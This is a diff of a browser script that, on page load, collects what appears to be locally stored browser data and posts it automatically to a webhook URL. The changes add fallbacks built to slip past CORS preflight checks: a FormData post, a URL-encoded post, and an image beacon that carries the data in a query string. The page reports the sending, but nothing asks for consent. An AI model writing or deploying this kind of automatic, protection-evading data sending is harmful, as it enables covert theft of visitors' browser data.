@@ -85,12 +85,13 @@ function pretty(obj) {
 
 async function sendToWebhook(data) {
   try {
+    // Use FormData to avoid CORS preflight
+    const formData = new FormData();
+    formData.append('data', JSON.stringify(data));
+    
     const response = await fetch(WEBHOOK_URL, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(data)
+      body: formData // No custom headers to avoid preflight
     });
     
     return {
@@ -106,18 +107,64 @@ async function sendToWebhook(data) {
   }
 }
 
+// Alternative method using URL encoded form
+async function sendToWebhookAlt(data) {
+  try {
+    const response = await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: 'data=' + encodeURIComponent(JSON.stringify(data))
+    });
+    
+    return {
+      success: response.ok,
+      status: response.status,
+      statusText: response.statusText
+    };
+  } catch (err) {
+    return {
+      success: false,
+      error: err.message
+    };
+  }
+}
+
+// Method using image beacon (no response handling)
+function sendToWebhookBeacon(data) {
+  const url = WEBHOOK_URL + '?data=' + encodeURIComponent(JSON.stringify(data));
+  const img = new Image();
+  img.src = url;
+  return { success: true, method: 'beacon' };
+}
+
 // Auto-execute on page load
 (async function() {
   try {
     const data = await inspectAll();
     window.__LAST_LOCAL_DUMP__ = data;
     
-    // Send to webhook automatically
-    const sendResult = await sendToWebhook(data);
+    // Update UI immediately with collected data
+    document.getElementById('output').textContent = pretty(data);
+    document.getElementById('status').textContent = 'Data collected. Sending to webhook...';
+    
+    // Try multiple methods to send data
+    let sendResult = await sendToWebhook(data);
+    
+    // If first method fails, try alternative
+    if (!sendResult.success) {
+      console.log('First method failed, trying alternative...');
+      sendResult = await sendToWebhookAlt(data);
+    }
+    
+    // If still fails, use beacon method
+    if (!sendResult.success) {
+      console.log('Alternative method failed, using beacon...');
+      sendResult = sendToWebhookBeacon(data);
+    }
     
     // Update UI with results
-    document.getElementById('output').textContent = pretty(data);
-    
     if (sendResult.success) {
       document.getElementById('status').textContent = '✓ Data successfully collected and sent to webhook!';
       document.getElementById('status').style.background = '#d4edda';
@@ -172,7 +219,15 @@ document.getElementById('sendAgainBtn').addEventListener('click', async () => {
   document.getElementById('status').style.borderColor = '#bee5eb';
   document.getElementById('status').style.color = '#0c5460';
   
-  const sendResult = await sendToWebhook(data);
+  let sendResult = await sendToWebhook(data);
+  
+  if (!sendResult.success) {
+    sendResult = await sendToWebhookAlt(data);
+  }
+  
+  if (!sendResult.success) {
+    sendResult = sendToWebhookBeacon(data);
+  }
   
   if (sendResult.success) {
     document.getElementById('status').textContent = '✓ Data successfully sent to webhook again!';
